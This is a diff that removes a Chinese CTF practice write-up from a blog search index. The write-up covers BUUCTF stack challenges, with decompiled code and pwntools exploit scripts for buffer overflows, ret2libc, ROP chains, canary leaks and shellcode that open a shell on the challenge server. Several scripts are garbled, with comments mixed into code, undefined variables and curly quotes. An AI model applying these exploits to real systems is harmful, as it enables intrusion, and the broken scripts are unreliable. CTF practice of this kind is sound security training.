@@ -1,108 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>pwn栈刷题记录</title>
-    <url>/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="栈问题"><a href="#栈问题" class="headerlink" title="栈问题"></a>栈问题</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag</p>
-<p>但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？</p>
-<p>于是我们需要<code>exit()</code>的地址，以及满足条件的a1和a2的值，即<code>0x308CD64F</code>和<code>0x195719D1</code></p>
-<p><strong>exp</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;i386&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27026</span>)</span><br><span class="line">ret = <span class="number">0x08048196</span></span><br><span class="line">exits = elf.sym[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;got exit addr : %s&quot;</span> % <span class="built_in">hex</span>(exits))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p32(<span class="number">0x080489A0</span>) + p32(exits) + p32(<span class="number">0x308CD64F</span>)+ p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Qual a palavrinha magica? &quot;</span> , timeout = <span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>先checksec一下，nx排除了shellcode的可能，Full RELEO为地址随机化</p>
-<p>先观察主函数，设定了一个闹钟(但是这道题不需要使用解除闹钟的方法)</p>
-<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095347-1678706371578-4.png"></p>
-<p>主函数的思路是生成一个随机数，把这个随机数作为参数传进sub——804871F()函数中，然后再将函数返回结果作为参数传进sub——80487D0()里,sub_80486bb()是初始化，没什么用。<strong>fd&#x3D;open(“&#x2F;dev&#x2F;urandom”,0);if(fd&gt;0) read(fd,&amp;buf,4u)</strong>:获取一个随机数给到buf</p>
-<p><strong>sub_804871f()</strong></p>
-<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095410.png"></p>
-<p>sprintf函数将生成的随机数加到s[32]的数组中，这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：<strong>使strncmp结果为0</strong></p>
-<p><strong>sub_80487d0()</strong></p>
-<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095400.png"></p>
-<p>这个函数将buf[7]作为参数出传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：<strong>使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</strong></p>
-<p><strong>思路</strong></p>
-<p>使用ROP链寻找libc解题</p>
-<p>首先让strncmp结果为零，当buf与s数组完全相同时，strncmp结果会为0，但是s为系统生成的随机数，而buf是我们输入的数据，两者显然不可能相等。另一种办法就是<strong>使v1等于0，这样strncmp的结果仍为0。</strong>而v1是strlen函数读取buf的长度大小，使他为0就很简单了，标准的长度检测绕过，让buf数组的第一位为<strong>‘\x00’</strong>即可。此时程序不会退出</p>
-<p>然后让buf[7]的值尽可能大，要实现栈溢出，buf[7]元素的ASCII码值必须大于两百四十多才行，所以要使用转义字符的ASCii码，’&#39;为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25352</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]<span class="string">&#x27;&#x27;&#x27;选择用write函数泄露libc地址&#x27;&#x27;&#x27;</span></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">main_func = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&quot;\x00&quot;</span>长度检测绕过+ <span class="string">b&quot;\xff&quot;</span>*<span class="number">7</span>让buf[<span class="number">7</span>]的值尽可能大,\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为<span class="number">255</span>的符号。</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">payload2 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xE7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,write_plt,main_func,<span class="number">1</span>,read_got,<span class="number">0x8</span>])</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(read_addr)</span><br><span class="line">libcbase = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="comment">#print libcbase</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(binsh)</span><br><span class="line">payload3 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xe7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,system_addr,<span class="number">0</span>,binsh])</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>
-
-<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>简单的rop</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r= remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27435</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">sys_addr=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x4006b3</span></span><br><span class="line">bin_sh=<span class="number">0x600a90</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_addr)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>from pwn import *<br>from LibcSearcher import *<br>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)<br>ret &#x3D; 0x4006b9      #靶机是ubuntu，所以需要栈平衡<br>elf &#x3D; ELF(‘pwn1’)<br>puts_plt &#x3D; elf.plt[“puts”]<br>puts_got &#x3D; elf.got[‘puts’]<br>main_addr &#x3D; elf.symbols[“main”]<br>pop_rdi_ret &#x3D; 0x400c83      #×64程序基本都存在的一个地址pop rdi；ret<br>p &#x3D; remote(‘node4.buuoj.cn’,25016)<br>payload &#x3D; b’a’ * (0x50 + 8)<br>payload &#x3D; payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>    print(payload)<br>p.sendlineafter(‘Input your choice!\n’, ‘1’)<br>p.sendlineafter(‘Input your Plaintext to be encrypted\n’, payload)<br>p.recvuntil(‘Ciphertext\n’)	<br>p.recvline()<br>puts_addr &#x3D; u64(p.recv(7)[:-1].ljust(8,b’\x00’))<br>print(puts_addr)      #找出puts的地址<br>libc &#x3D; LibcSearcher(‘puts’, puts_addr)<br>libc_base   &#x3D; puts_addr - libc.dump(‘puts’)      #找出函数地址偏移量<br>system_addr &#x3D; libc_base + libc.dump(‘system’)      #计算出system的在程序中的地址<br>binsh_addr  &#x3D; libc_base + libc.dump(‘str_bin_sh’)	<br>payload &#x3D; b’a’ * (0x50 + 8)<br>payload &#x3D; payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>p.sendlineafter(‘Input your choice!\n’, ‘1’)<br>p.sendlineafter(‘Input your Plaintext to be encrypted\n’, payload)<br>p.interactive()</p>
-<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>from pwn import *<br>elf &#x3D; ELF(“.&#x2F;not_the_same_3dsctf_2016”)<br>io &#x3D; remote(“node4.buuoj.cn”,28787)<br>io &#x3D; process(“.&#x2F;not_the_same_3dsctf_2016”)<br>backdoor_addr &#x3D; 0x080489A0<br>str_flag_addr &#x3D; 0x080ECA2D<br>printf_addr &#x3D; 0x0804F0A0<br>write_addr &#x3D; elf.symbols[‘write’]<br>exit_addr &#x3D; elf.symbols[‘exit’]<br>print(hex(write_addr))<br>这个main函数没有push ebp 所以不用再覆盖4字节的ebp<br>payload &#x3D; 0x2D * b’a’ + p32(backdoor_addr) + p32(write_addr) + p32(exit_addr) + p32(1) + p32(str_flag_addr) + p32(45)#覆盖了栈，没有覆盖ebp，原因是不存在ebp，字符串空间的底部就是函数的返回地址覆盖返回地址，返回到get_secret函数从get_secret函数返回到write函数#exit位置是write的返回的值，没什么用，随便填<br>payload +&#x3D; p32(1)           # write函数的第一个参数，是 文件描述符；<br>payload +&#x3D; p32(flagaddr)    # write函数的第二个参数，是 存放字符串的内存地址；<br>payload +&#x3D; p32(42)          # write函数的第三个参数，是 打印字符串的长度<br>io.sendline(payload)<br>io.interactive()<br>io.close()</p>
-<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>from pwn import *<br>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>elf &#x3D; ELF(“.&#x2F;pwn4”)<br>p &#x3D; remote(‘node4.buuoj.cn’,25661)<br>shellcode&#x3D;asm(shellcraft.sh())<br>p.sendlineafter(‘name\n’,shellcode)<br>payload&#x3D;flat(b’a’*0x28+p64(0x601080))<br>p.sendlineafter(‘me?\n’,payload)<br>p.interactive()</p>
-<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>#encoding &#x3D; utf-8<br>from pwn import *<br>from LibcSearcher import *<br>context(os &#x3D; ‘linux’,arch &#x3D; ‘i386’,log_level &#x3D; ‘debug’)<br>elf &#x3D; ELF(‘.&#x2F;2018_rop’)<br>p &#x3D; remote(‘node4.buuoj.cn’,25020)<br>main_addr      &#x3D; elf.sym[‘main’]<br>plt_write_addr &#x3D; elf.plt[‘write’]<br>got_write_addr &#x3D; elf.got[‘write’]<br>payload        &#x3D; b’a’<em>(0x88+0x4) + p32(plt_write_addr) + p32(main_addr) + p32(1) + p32(got_write_addr) + p32(4)<br>p.sendline(payload)<br>write_addr     &#x3D; u32(p.recv(4))<br>print(hex(write_addr))<br>lib             &#x3D; LibcSearcher(‘write’,write_addr)<br>lib_write_addr  &#x3D; lib.dump(‘write’)<br>lib_system_addr &#x3D; lib.dump(‘system’)<br>lib_bin_addr    &#x3D; lib.dump(‘str_bin_sh’)<br>base_addr       &#x3D; write_addr - lib_write_addr<br>system_addr     &#x3D; base_addr  + lib_system_addr<br>bin_addr 	&#x3D; base_addr  + lib_bin_addr<br>payload &#x3D; b’a’</em>(0x88+0x4) + p32(system_addr) + b’aaaa’ + p32(bin_addr)<br>p.sendline(payload)<br>p.interactive()</p>
-<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>from pwn import*<br>from LibcSearcher import *<br>context.log_level&#x3D;’debug’<br>r&#x3D;remote(‘node4.buuoj.cn’,28646)<br>elf&#x3D;ELF(‘.&#x2F;pwn6’)<br>main_addr&#x3D;elf.sym[‘main’]<br>puts_plt&#x3D;elf.plt[‘puts’]<br>puts_got&#x3D;elf.got[‘puts’]<br>pop_ret&#x3D;0x400733<br>payload1&#x3D;b’a’*0x28+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</p>
-<p>这里需要注意一下payload64位先往寄存器中传参顺序要注意！！！<br>r.recvuntil(“Pull up your sword and tell me u story!”)<br>r.sendline(payload1)<br>r.recv()<br>puts_addr&#x3D;u64(r.recv(6).ljust(8,b’\x00’))<br>libc&#x3D;LibcSearcher(‘puts’,puts_addr)<br>libc_base &#x3D; puts_addr - libc.dump(‘puts’)<br>system &#x3D; libc_base+libc.dump(‘system’)<br>bins &#x3D; libc_base+libc.dump(‘str_bin_sh’)<br>payload2&#x3D;b’A’*0x28+p64(pop_ret)+p64(bins)+p64(system)<br>r.recvuntil(“Pull up your sword and tell me u story!”)<br>r.sendline(payload2)<br>r.interactive()</p>
-<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><p>from pwn import*<br>elf&#x3D;ELF(‘pwn7’)<br>r&#x3D;remote(‘node4.buuoj.cn’,28553)<br>back_addr&#x3D;elf.symbols[‘backdoor’]<br>r.recv()<br>r.sendline(b’-1’)<br>payload&#x3D;b’a’*(0x10+8)+p64(back_addr)<br>r.sendline(payload)<br>r.interactive()</p>
-<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>from pwn import *<br>context(os&#x3D;”linux”,arch&#x3D;”i386”,log_level&#x3D;”debug”)<br>elf&#x3D;ELF(‘pwn8’)<br>p&#x3D;remote(‘node4.buuoj.cn’,29794)<br>sys_addr&#x3D;0x08048400<br>leave_addr&#x3D;0x8048562<br>payload1&#x3D;b’a’*0x27<br>p.sendlineafter(‘name?\n’,payload1)<br>p.recvuntil(‘\n’)<br>ebp&#x3D;u32(p.recv(4))<br>payload2&#x3D;b’a’*4+p32(sys_addr)+p32(0)+p32(ebp-0x28)+b’&#x2F;bin&#x2F;sh’<br>payload2&#x3D;payload2.ljust(0x28,b’\0’)<br>payload2+&#x3D;p32(ebp-0x38)看当时的ebp+p32(leave_addr)<br>p.sendline(payload2)<br>p.interactive()</p>
-<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><p>整数溢出问题<br>from pwn import*<br>from LibcSearcher import*<br>p&#x3D;remote(‘node4.buuoj.cn’,29476)<br>elf&#x3D;ELF(‘.&#x2F;pwn9’)<br>printf_plt&#x3D;elf.plt[‘printf’]<br>printf_got&#x3D;elf.got[‘printf’]<br>vuln&#x3D;0x0804852f<br>main&#x3D;0x080485b8<br>p.recvuntil(‘read?’)<br>p.sendline(str(-1))<br>p.recvuntil(‘data!\n’)<br>payload&#x3D;b’a’*0x30+p32(printf_plt)+p32(vuln)+p32(printf_got)<br>p.sendline(payload)<br>p.recvuntil(‘\n’)<br>printf_add&#x3D;u32(p.recv(4))<br>print(hex(printf_add))<br>libc&#x3D;LibcSearcher(‘printf’,printf_add)<br>libc_base&#x3D;printf_add-libc.dump(‘printf’)<br>system&#x3D;libc_base+libc.dump(‘system’)<br>binsh&#x3D;libc_base+libc.dump(‘str_bin_sh’)<br>p.recvuntil(‘read?’)<br>p.sendline(str(-1))<br>p.recvuntil(‘data!\n’)<br>payload&#x3D;b’a’*0x30+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()</p>
-<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><p>32位ret2libc<br>from pwn import *<br>from LibcSearcher import *<br>context.log_level &#x3D; ‘debug’<br>conn &#x3D; remote(‘node4.buuoj.cn’,25837)<br>elf &#x3D; ELF(‘.&#x2F;level3’)<br>write_plt &#x3D; elf.plt[‘write’]<br>write_got &#x3D; elf.got[‘write’]<br>main_addr &#x3D; 0x0804844B<br>payload &#x3D; b’a’*0x88 + b’b’*4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)<br>conn.sendlineafter(“Input:\n”,payload)<br>write_addr &#x3D; u32(conn.recv(4))<br>print(hex(write_addr))<br>libc &#x3D; LibcSearcher(‘write’,write_addr)<br>libc_base &#x3D; write_addr - libc.dump(‘write’)<br>system_addr &#x3D; libc_base + libc.dump(‘system’)<br>bin_sh &#x3D; libc_base + libc.dump(‘str_bin_sh’)<br>payload &#x3D; b’a’*0x88 + b’b’*4 + p32(system_addr) + p32(main_addr) + p32(bin_sh)<br>conn.sendlineafter(“Input:\n”,payload)<br>conn.interactive()</p>
-<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>from pwn import *</p>
-<p>#start<br>r &#x3D; remote(‘node4.buuoj.cn’,25683)<br>r &#x3D; process(“..&#x2F;buu&#x2F;[HarekazeCTF2019]baby_rop2”)<br>elf &#x3D; ELF(‘babyrop2’)<br>libc &#x3D; ELF(“libc.so.6”)</p>
-<p>#params<br>rdi_addr &#x3D; 0x400733<br>rsi_r15_addr &#x3D; 0x400731<br>main_addr &#x3D; elf.symbols[‘main’]<br>printf_plt&#x3D;elf.plt[‘printf’]<br>read_got&#x3D;elf.got[‘read’]<br>format_str &#x3D; 0x400770</p>
-<p>#attack<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(format_str) + p64(rsi_r15_addr) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)<br>r.recv()<br>r.sendline(payload)<br>read_addr &#x3D; u64(r.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))<br>print(“read_addr: “ + hex(read_addr))</p>
-<p>#libc<br>base_addr &#x3D; read_addr - libc.symbols[‘read’]<br>system_addr &#x3D; base_addr + libc.symbols[‘system’]<br>bin_sh_addr &#x3D; base_addr + next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>print(“system_addr: “ + (hex(system_addr)))<br>print(“bin_sh_addr: “ + (hex(bin_sh_addr)))</p>
-<p>#attack2<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)<br>r.recv()<br>r.sendline(payload)</p>
-<p>r.interactive()</p>
-<h2 id="2021-鹤城杯-littleof"><a href="#2021-鹤城杯-littleof" class="headerlink" title="[2021 鹤城杯]littleof"></a>[2021 鹤城杯]littleof</h2><p><strong>checksec一下</strong></p>
-<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png"></p>
-<p>发现有canary保护</p>
-<p><strong>ida查看</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4006E2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="built_in">stdin</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s. Try harder!&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>很显然栈溢出漏洞位于read函数中，buf大小为0x50，而read函数的第三参数，也就是<strong>输出&#x2F;写入&#x2F;输出</strong>的最大的字节长度为0x100，就是2个buf大小的数据。但是本题开启了Canary，因此我们不能直接进行栈溢出以及Ret2Libc攻击。我们可以发现，我们输入的Payload会被第二段的printf打印出来。也就是说可以利用这个printf打印出来Canary，将Canary原封不动的归位，即可跳过检测。</p>
-<p><strong>canary</strong></p>
-<p>Canary是位于EBP之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击的。我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。</p>
-<p>也就是说：</p>
-<p><strong>假如我的 buf 大小为 0x50</strong></p>
-<p><strong>如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。</strong></p>
-<p><strong>也就是说 我的可用空间只有 0x42 。</strong></p>
-<p><strong>开启 Canary ： RBP 位于 0x50 + 0x08，Canary位于0x50 - 0x08，Return Address位于0x50 + 0x16</strong></p>
-<p><strong>而 0x50 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址</strong></p>
-<p><strong>关闭 Canary ： RBP 位于 0x50，Return Address位于0x50 + 0x08</strong></p>
-<p><strong>这时候的 0x50 + 0x08 是 Return Address 的地址。</strong></p>
-<p>具体思路如下：</p>
-<p><strong>因为Canary是栈中的一个随机值，我们通过printf泄露Canary，然后将其填充至它本来应该在的位置，就能通过检查。</strong></p>
-<p><strong>exp</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#io = process(&quot;littleof&quot;)</span></span><br><span class="line">io = remote()</span><br><span class="line">elf = ELF(<span class="string">&quot;littleof&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">rdi = <span class="number">0x400863</span></span><br><span class="line">ret = <span class="number">0x40059E</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400789</span></span><br><span class="line"> </span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * ( <span class="number">0x50</span> - <span class="number">0x08</span> )</span><br><span class="line">Padding_Ret = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x08</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> 发送了<span class="number">0x49</span>个字节，总共<span class="number">0x50</span>个字节，程序会把Canary放在变量起始位置，所以只需要接收<span class="number">7</span>个，然后用一个<span class="number">0</span>填充即可。</span><br><span class="line"> Payload_Leak = Padding + p64(Canary) + Padding_Ret + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Leak)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Real Address: &quot;</span> + (<span class="built_in">hex</span>(addr)))</span><br><span class="line"> </span><br><span class="line"><span 